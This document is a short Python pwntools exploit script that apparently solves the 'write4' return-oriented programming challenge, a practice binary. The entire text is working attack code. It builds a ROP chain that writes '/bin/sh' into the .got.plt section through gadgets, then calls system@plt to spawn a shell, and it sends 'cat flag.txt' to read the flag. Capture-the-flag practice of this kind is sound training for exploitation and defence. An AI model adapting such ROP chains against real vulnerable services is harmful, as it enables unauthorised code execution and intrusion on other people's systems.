#!/usr/bin/python
from pwn import *
if __name__ == "__main__":
    payload = ""
    payload += cyclic(40)
    payload += p64(0x00000000400890)  # pop r14; pop r15; ret
    payload += p64(0x00000000601000)  # .got.plt
    payload += p64(0x68732f6e69622f)  # /bin/sh
    payload += p64(0x00000000400820)  # mov qword ptr [r14], r15; ret
    payload += p64(0x00000000400893)  # pop rdi; ret
    payload += p64(0x00000000601000)  # .got.plt
    payload += p64(0x00000000400810)  # call system@plt

    elf = ELF("./write4")
    io  = process(elf.path)
    io.recv()
    io.sendline(payload)
    io.sendline("cat flag.txt")
    print io.recv()
